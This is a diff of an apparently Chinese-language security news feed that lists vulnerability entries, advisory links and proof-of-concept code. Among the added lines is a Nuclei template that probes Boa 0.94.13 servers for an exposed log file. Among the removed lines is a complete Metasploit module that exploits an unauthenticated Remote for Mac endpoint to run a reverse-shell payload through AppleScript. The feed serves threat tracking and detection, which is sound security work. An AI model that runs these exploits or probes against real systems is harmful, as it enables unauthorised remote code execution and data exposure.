@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-09T07:45:13.607Z</updated>
+  <updated>2025-06-09T08:45:16.807Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,62 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Boa 0.94.13 信息泄露漏洞</title>
+    <link href="http://example.com/2025/06/09/github_1021118847/"/>
+    <id>http://example.com/2025/06/09/github_1021118847/</id>
+    <published>2025-06-09T08:45:16.809Z</published>
+    <updated>2025-06-09T08:45:16.807Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> Boa 0.94.13 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-33558</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Boa 0.94.13 版本存在信息泄露漏洞，远程攻击者可以通过访问特定的文件（如backup.html, preview.html, js&#x2F;log.js, log.html, email.html, online-users.html, 和 config.js）获取敏感信息。需要注意的是，有第三方报告指出这些文件并非Boa的一部分，因此可能是特定站点配置问题。</p><p><strong>产品厂商：</strong> boa</p><p><strong>产品名称：</strong> boa</p><p><strong>影响版本：</strong> 0.94.13</p><p><strong>搜索语法：</strong> Server: Boa&#x2F;0.94.13</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/954d372c745675430f2fdcbb39e46e8de3fe05c8/http%2Fcves%2F2021%2FCVE-2021-33558.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/954d372c745675430f2fdcbb39e46e8de3fe05c8/http%2Fcves%2F2021%2FCVE-2021-33558.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">33558</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Boa <span class="hljs-number">0.94</span>.<span class="hljs-number">13</span> <span class="hljs-operator">-</span> Information Disclosure<br>  <span class="hljs-params">author:</span> DhiyaneshDK<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    Boa <span class="hljs-number">0.94</span>.<span class="hljs-number">13</span> allows remote attackers to obtain sensitive information via a misconfiguration involving backup.html, preview.html, js<span class="hljs-operator">/</span>log.js, log.html, email.html, online-users.html, and config.js. NOTE- multiple third parties report that this is a site-specific issue because those files are not part of Boa.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>sourceforge.net<span class="hljs-operator">/</span>projects<span class="hljs-operator">/</span>boa<span class="hljs-operator">/</span>files<span class="hljs-operator">/</span>boa<span class="hljs-operator">/</span><span class="hljs-number">0.94</span>.<span class="hljs-number">13</span><span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/mdanzaruddin/CVE-2021-33558</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:N<span class="hljs-operator">/</span>A:N<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">7.5</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">33558</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.24349</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.95798</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:boa:boa:<span class="hljs-number">0.94</span>.<span class="hljs-number">13</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> boa<br>    <span class="hljs-params">product:</span> boa<br>    <span class="hljs-params">shodan-query:</span> &#x27;<span class="hljs-params">Server:</span> Boa<span class="hljs-operator">/</span><span class="hljs-number">0.94</span>.<span class="hljs-number">13</span>&#x27;<br>    <span class="hljs-params">fofa-query:</span> <span class="hljs-string">&quot;Server: Boa/0.94.13&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2021,boa,kev,info-leak<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/js/log.js&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;function SearchLog&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;logTime&quot;</span><br>        <span class="hljs-params">condition:</span> and<br>        <span class="hljs-params">case-insensitive:</span> <span class="hljs-literal">true</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>漏洞通告 | Roundcube Webmail存在反序列化漏洞</title>
+    <link href="http://example.com/2025/06/09/weixin_3931361007/"/>
+    <id>http://example.com/2025/06/09/weixin_3931361007/</id>
+    <published>2025-06-09T08:40:29.434Z</published>
+    <updated>2025-06-09T08:40:29.432Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 微步在线研究响应中心</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/vizPjgfzdguULD-2_terQQ">https://mp.weixin.qq.com/s/vizPjgfzdguULD-2_terQQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 微步在线研究响应中心&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/vizPjgfzdguULD-2_terQQ&quot;&gt;https://mp.weixi</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="微步在线研究响应中心" scheme="http://example.com/tags/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E7%A0%94%E7%A9%B6%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83/"/>
+    
+  </entry>
   
   <entry>
     <title>Chromium Blink Use-After-Free Vulnerability</title>
@@ -97,9 +153,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
     <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
   </entry>
   
@@ -155,9 +211,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
     <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
     
   </entry>
   
@@ -175,6 +231,33 @@
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/XU-zqBX8ITj09cl5IAUMPQ&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>付费近期暗网 0day 售卖预警</title>
+    <link href="http://example.com/2025/06/09/weixin_2415514355/"/>
+    <id>http://example.com/2025/06/09/weixin_2415514355/</id>
+    <published>2025-06-09T06:08:30.843Z</published>
+    <updated>2025-06-09T08:44:15.533Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/xXmbHwfOfGxQosOAxakaow">https://mp.weixin.qq.com/s/xXmbHwfOfGxQosOAxakaow</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/xXmbHwfOfGxQosOAxakaow&quot;&gt;https://mp.weixin.qq.c</summary>
       
     
     
@@ -488,98 +571,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
     <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
     
-  </entry>
-  
-  <entry>
-    <title>CVE-2025-5840 Exploit</title>
-    <link href="http://example.com/2025/06/08/github_2646467311/"/>
-    <id>http://example.com/2025/06/08/github_2646467311/</id>
-    <published>2025-06-08T15:15:14.648Z</published>
-    <updated>2025-06-08T15:15:14.647Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> CVE-2025-5840 Exploit</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5840</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> CVE-2025-5840的利用程序，由haxerr9用Python编写。</p><p><strong>来源：</strong> <a href="https://github.com/haxerr9/CVE-2025-5840">https://github.com/haxerr9/CVE-2025-5840</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><br># CVE<span class="hljs-string">-2025</span><span class="hljs-string">-5840</span><br>CVE<span class="hljs-string">-2025</span><span class="hljs-string">-5840</span> Exploit Written In Python By haxerr9<br><br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><br><span class="hljs-bullet">- </span>README.md<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-5840 Exploit&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-5840&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Remote for Mac 未授权远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/08/github_3664824571/"/>
-    <id>http://example.com/2025/06/08/github_3664824571/</id>
-    <published>2025-06-08T14:45:28.112Z</published>
-    <updated>2025-06-08T14:45:28.108Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Remote for Mac 未授权远程代码执行漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块利用了Remote for Mac版本2025.7及之前版本中的&#x2F;api&#x2F;executeScript端点的未授权远程代码执行漏洞。当目标系统上禁用身份验证时，攻击者可以执行任意AppleScript命令，包括通过<code>do shell script</code>执行的shell命令。所有版本直至2025.7（包括补丁版本）均易受攻击。</p><p><strong>产品名称：</strong> Remote for Mac</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2025.7</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/f20e72b6c8b2f3fd5b628f6bdeb0cfdfd7c8350c/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb">https://github.com/rapid7/metasploit-framework/blob/f20e72b6c8b2f3fd5b628f6bdeb0cfdfd7c8350c/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github commit</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-built_in">require</span> <span class="hljs-string">&#x27;json&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = NormalRanking<br><br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Remote for Mac Unauthenticated RCE&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits an unauthenticated remote code execution vulnerability <span class="hljs-keyword">in</span><br>          Remote <span class="hljs-keyword">for</span> Mac versions up <span class="hljs-keyword">to</span> <span class="hljs-keyword">and</span> including <span class="hljs-number">2025.7</span> via the /api/executeScript endpoint.<br>          When authentication <span class="hljs-keyword">is</span> disabled <span class="hljs-literal">on</span> the target system, <span class="hljs-literal">it</span> allows attackers <span class="hljs-keyword">to</span> execute<br>          arbitrary AppleScript commands, which can include shell commands via `<span class="hljs-keyword">do</span> shell script`.<br>          All versions up <span class="hljs-keyword">to</span> <span class="hljs-number">2025.7</span> (including patch versions) are vulnerable.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<span class="hljs-string">&#x27;Chokri Hammedi (@blue0x1)&#x27;</span>],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;PACKETSTORM&#x27;</span>, <span class="hljs-string">&#x27;195347&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-05-27&#x27;</span>,<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;unix&#x27;</span>, <span class="hljs-string">&#x27;osx&#x27;</span>],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [[<span class="hljs-string">&#x27;Auto&#x27;</span>, &#123;&#125;]],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;SSL&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br>  end<br><br>  def check<br>    res = send_request_cgi(<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;api&#x27;</span>, <span class="hljs-string">&#x27;getVersion&#x27;</span>),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">return</span> CheckCode::Unknown(<span class="hljs-string">&#x27;No response from target&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    info = res.get_json_document<br><br>    <span class="hljs-keyword">if</span> info.empty?<br>      <span class="hljs-keyword">return</span> CheckCode::Unknown(<span class="hljs-string">&#x27;Unable to parse JSON from /api/getVersion&#x27;</span>)<br>    end<br><br>    <span class="hljs-keyword">if</span> info[<span class="hljs-string">&#x27;requires.auth&#x27;</span>] == <span class="hljs-literal">true</span><br>      <span class="hljs-keyword">return</span> CheckCode::Safe(<span class="hljs-string">&#x27;Target requires authentication on /api/executeScript&#x27;</span>)<br>    end<br><br>    version = info[<span class="hljs-string">&#x27;version&#x27;</span>].to_s<br>    <span class="hljs-keyword">if</span> version.empty?<br>      <span class="hljs-keyword">return</span> CheckCode::Unknown(<span class="hljs-string">&#x27;Could not determine target version&#x27;</span>)<br>    end<br><br>    target_version = Rex::Version.<span class="hljs-keyword">new</span>(version)<br>    vulnerable_version = Rex::Version.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;2025.7&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> target_version &lt;= vulnerable_version<br>      <span class="hljs-keyword">return</span> CheckCode::Appears<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-keyword">return</span> CheckCode::Safe(<span class="hljs-string">&quot;Target version <span class="hljs-subst">#&#123;version&#125;</span> is not vulnerable&quot;</span>)<br>    end<br>  end<br><br>  def exploit<br>    print_status(<span class="hljs-string">&quot;Generating reverse shell payload for <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>]&#125;</span>:<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;LPORT&#x27;</span>]&#125;</span>&quot;</span>)<br>    cmd = payload.encoded<br>    applescript = %(<span class="hljs-keyword">do</span> shell script <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;cmd&#125;</span>&quot;</span>)<br><br>    host_name = Rex::Text.rand_text_alpha(<span class="hljs-number">8</span>)<br>    host_model = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha(<span class="hljs-number">4</span>)&#125;</span><span class="hljs-subst">#&#123;rand(<span class="hljs-number">99</span>)&#125;</span>&quot;</span><br>    script_name = Rex::Text.rand_text_alpha(<span class="hljs-number">8</span>)<br><br>    print_status(<span class="hljs-string">&quot;Sending exploit to <span class="hljs-subst">#&#123;rhost&#125;</span>:<span class="hljs-subst">#&#123;rport&#125;</span> via AppleScript&quot;</span>)<br>    res = send_request_cgi(<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;api&#x27;</span>, <span class="hljs-string">&#x27;executeScript&#x27;</span>),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;X-ClientToken&#x27;</span> =&gt; Rex::Text.rand_text_numeric(<span class="hljs-number">4</span>),<br>        <span class="hljs-string">&#x27;X-HostName&#x27;</span> =&gt; host_name,<br>        <span class="hljs-string">&#x27;X-HostFullModel&#x27;</span> =&gt; host_model,<br>        <span class="hljs-string">&#x27;X-Script&#x27;</span> =&gt; applescript,<br>        <span class="hljs-string">&#x27;X-ScriptName&#x27;</span> =&gt; script_name,<br>        <span class="hljs-string">&#x27;X-ScriptDelay&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span><br>      &#125;<br>    )<br><br>    print_status(<span class="hljs-string">&#x27;Payload sent&#x27;</span>)<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;Payload delivered successfully. Awaiting session...&#x27;</span>)<br>      res_json = res.get_json_document<br>      print_status(<span class="hljs-string">&quot;Received response: <span class="hljs-subst">#&#123;res_json[<span class="hljs-string">&#x27;result&#x27;</span>]&#125;</span>&quot;</span>)<br>    end<br>  end<br>end<br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Remote for Mac 未授权远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/strong&gt; 未授权访问&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞等级：&lt;/strong&gt; 高危&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞描</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    
-    <category term="rapid7/metasploit-framework:github commit" scheme="http://example.com/tags/rapid7-metasploit-framework-github-commit/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Palo Alto Networks PAN-OS 命令注入漏洞</title>
-    <link href="http://example.com/2025/06/08/github_963420062/"/>
-    <id>http://example.com/2025/06/08/github_963420062/</id>
-    <published>2025-06-08T14:45:13.441Z</published>
-    <updated>2025-06-08T14:45:13.436Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Palo Alto Networks PAN-OS 命令注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-3400</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞描述：</strong> Palo Alto Networks PAN-OS 存在命令注入漏洞，攻击者可通过构造恶意请求执行任意命令。</p><p><strong>产品厂商：</strong> Palo Alto Networks</p><p><strong>产品名称：</strong> PAN-OS</p><p><strong>来源：</strong> <a href="https://github.com/CyberBibs/SOC274---Palo-Alto-Networks-PAN-OS-Command-Injection-Vulnerability-Exploitation-CVE-2024-3400-">https://github.com/CyberBibs/SOC274---Palo-Alto-Networks-PAN-OS-Command-Injection-Vulnerability-Exploitation-CVE-2024-3400-</a></p><p><strong>类型：</strong> CVE-2024:github search</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><br># SOC274---Palo-Alto-Networks-PAN-OS-Command-Injection-Vulnerability-Exploitation-CVE<span class="hljs-string">-2024</span><span class="hljs-string">-3400</span>-<br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><br><span class="hljs-bullet">- </span>README.md<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Palo Alto Networks PAN-OS 命令注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2024-3400&lt;/l</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
